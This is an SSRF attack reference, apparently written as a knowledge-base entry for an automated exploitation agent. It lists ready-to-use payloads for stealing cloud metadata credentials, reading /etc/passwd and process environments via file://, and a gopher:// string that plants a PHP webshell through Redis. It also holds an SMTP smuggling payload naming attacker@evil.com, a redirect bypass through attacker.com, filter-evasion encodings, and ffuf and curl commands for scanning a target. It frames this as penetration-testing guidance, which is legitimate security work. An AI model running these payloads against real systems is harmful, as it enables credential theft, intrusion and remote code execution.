---
vuln_type: ssrf
severity: high
cwe: [CWE-918]
owasp: A10:2021-SSRF
related_tools: [curl, interactsh, ffuf]
exploit_agent: ssrf_agent
tags: [ssrf, server-side-request-forgery, cloud-metadata, internal-network, oob, blind-ssrf]
---

# Server-Side Request Forgery (SSRF)

## Overview
Occurs when an application fetches a remote resource using a user-supplied URL without proper validation. The attacker can make the server send requests to internal services, cloud metadata endpoints, or arbitrary external systems — effectively using the server as a proxy.

---

## Injection Points

| Location | Example | Notes |
|----------|---------|-------|
| URL parameter | `?url=http://internal` | Most common |
| POST body | `{"webhook":"http://internal"}` | API callbacks |
| File import | `Import from URL: http://internal` | PDF generators, image loaders |
| XML/SVG | `<!ENTITY x SYSTEM "http://internal">` | XXE + SSRF |
| Redirect parameter | `?redirect=http://internal` | Open redirect chained to SSRF |
| HTTP headers | `Referer: http://internal` | Rare, app-specific |
| File path | `?file=http://internal/secret` | When app fetches files by URL |

### Common vulnerable features
- URL previews / link unfurling (Slack-style)
- PDF/image generation from URL
- Webhook configuration
- Import from URL (RSS, CSV, avatar)
- Proxy/redirect endpoints
- File download by URL

---

## Detection Techniques

### Step 1: Identify URL-accepting parameters
Look for parameters named: `url`, `link`, `src`, `href`, `path`, `file`, `redirect`, `callback`, `webhook`, `feed`, `uri`, `domain`, `dest`, `target`, `proxy`, `page`

### Step 2: Test with external callback
```
http://YOUR_INTERACTSH_URL
https://YOUR_INTERACTSH_URL
```
If you receive a callback on your server, the application made a server-side request → SSRF confirmed.

### Step 3: Test internal access
```
http://127.0.0.1
http://localhost
http://127.0.0.1:8080
http://[::1]
http://0.0.0.0
```

### Step 4: Determine scope
- Can you control the full URL or just part of it?
- Can you read the response or is it blind?
- What protocols are supported? (http, https, file, gopher, dict, ftp)

---

## Exploitation Strategies

### 1. Access Internal Services

```
# Common internal services
http://127.0.0.1:80          # Local web server
http://127.0.0.1:8080        # Application server
http://127.0.0.1:3000        # Node/Rails dev server
http://127.0.0.1:8888        # Jupyter
http://127.0.0.1:9200        # Elasticsearch
http://127.0.0.1:6379        # Redis
http://127.0.0.1:11211       # Memcached
http://127.0.0.1:27017       # MongoDB
http://127.0.0.1:5432        # PostgreSQL
http://127.0.0.1:3306        # MySQL
http://127.0.0.1:25          # SMTP
```

### 2. Cloud Metadata Endpoints (CRITICAL for cloud-hosted targets)

**AWS (most common):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
```
AWS IMDSv2 (requires token — harder but possible if SSRF allows custom headers):
```
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: TOKEN
```

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```
Requires header: `Metadata-Flavor: Google`

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Requires header: `Metadata: true`

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

### 3. Internal Network Scanning
Use SSRF to port scan internal hosts:
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://10.0.0.1:8080
```
Differences in response time or error messages reveal open ports.

### 4. Protocol Smuggling

**file:// — Read local files:**
```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///C:/Windows/win.ini
```

**gopher:// — Send arbitrary TCP data (Redis, SMTP, etc.):**
```
# Write to Redis
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A

# Redis webshell via gopher
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20payload%20"<?php system($_GET['cmd']); ?>"%0D%0ASAVE%0D%0A

# SMTP email send
gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>%0D%0ARCPT%20TO:<admin@target.com>%0D%0ADATA%0D%0ASubject:pwned%0D%0A%0D%0ASSRF%20email%0D%0A.%0D%0A
```

**dict:// — Interact with dict protocol services:**
```
dict://127.0.0.1:6379/INFO
```

### 5. Chaining SSRF with other vulns
- SSRF → Internal admin panel (no auth on internal network)
- SSRF → Cloud credentials → AWS/GCP/Azure account takeover
- SSRF → Redis → Webshell → RCE
- SSRF → Internal API → Data exfiltration
- XXE → SSRF → file read

---

## Bypass Techniques

### IP address obfuscation (bypass localhost/127.0.0.1 blocklist)
```
# Decimal
http://2130706433          (= 127.0.0.1)
http://017700000001        (octal)

# Hex
http://0x7f000001

# IPv6
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]

# Mixed encoding
http://127.1
http://127.0.1
http://0
http://0.0.0.0

# DNS rebinding
# Register a domain that resolves to 127.0.0.1
http://spoofed.burpcollaborator.net   (resolves to 127.0.0.1)
http://1.1.1.1.nip.io                (= 1.1.1.1)
http://127.0.0.1.nip.io              (= 127.0.0.1)
```

### URL parsing confusion
```
# @ trick — basic auth user section
http://allowed-host@127.0.0.1
http://allowed-host%40127.0.0.1

# Fragment/path confusion
http://127.0.0.1#@allowed-host
http://127.0.0.1%23@allowed-host

# Backslash (some parsers)
http://allowed-host\@127.0.0.1

# URL encoding
http://127.0.0.1%00@allowed-host
http://127%2e0%2e0%2e1
```

### Redirect-based bypass
If SSRF blocks internal IPs but follows redirects:
1. Set up: `https://attacker.com/redirect` → 302 to `http://127.0.0.1`
2. Submit: `?url=https://attacker.com/redirect`
3. Server follows redirect to internal IP

### Protocol bypass
```
# When only http/https blocked
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO

# When scheme validated
http://127.0.0.1:80
https://127.0.0.1:443
```

### Domain-based bypass
```
# Subdomain of target that resolves internally
http://internal.target.com

# DNS that resolves to localhost
http://localtest.me          (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net
```

---

## Blind SSRF

When you can trigger requests but cannot see the response:

### Confirmation via out-of-band
```
# Use interactsh or similar
?url=http://YOUR_INTERACTSH_URL

# Check for DNS resolution
?url=http://unique-token.YOUR_INTERACTSH_URL
```

### Timing-based detection
```
# Open port: fast response
?url=http://127.0.0.1:80     → 200ms

# Closed port: slow timeout or different error
?url=http://127.0.0.1:12345  → 10000ms or connection refused
```

### Exfiltration via blind SSRF
If you can read internal resources but can't see them:
```
# Redirect internal data to your server
# Chain: SSRF → internal page → data reflected → exfil via webhook
```

---

## Automated Testing

### With ffuf (fuzz internal ports)
```bash
# Generate port list
seq 1 65535 > ports.txt

# Fuzz internal ports via SSRF
ffuf -u "http://target/fetch?url=http://127.0.0.1:FUZZ/" -w ports.txt -mc all -fs SIZE_OF_ERROR_RESPONSE
```

### With curl (manual verification)
```bash
# Test basic SSRF
curl -s "http://target/fetch?url=http://YOUR_INTERACTSH_URL"

# Test cloud metadata
curl -s "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# Test file protocol
curl -s "http://target/fetch?url=file:///etc/passwd"
```

---

## Output Interpretation

### Confirmed SSRF indicators
- Interactsh receives callback from target server IP
- Response contains internal service data (HTML, JSON from internal API)
- Cloud metadata returned (IAM role names, credentials, instance IDs)
- Local file contents returned (`/etc/passwd`, `win.ini`)
- Different response codes/times for open vs closed internal ports

### Blind SSRF indicators
- OOB callback received but no response data visible
- Timing differences for different internal IPs/ports
- Error messages that leak internal info ("Connection refused to 10.0.0.5:8080")

### Not SSRF (false positives)
- Application fetches URL but only on the client side (JavaScript fetch)
- Redirect happens in browser, not server-side
- URL is validated and only allows specific domains
- Response is the same regardless of URL provided

### Severity assessment
- **Critical**: Cloud metadata credentials accessible, RCE via protocol smuggling
- **High**: Can read internal resources or local files
- **Medium**: Blind SSRF with OOB confirmation, internal port scanning
- **Low**: Blind SSRF with timing only, no data extraction
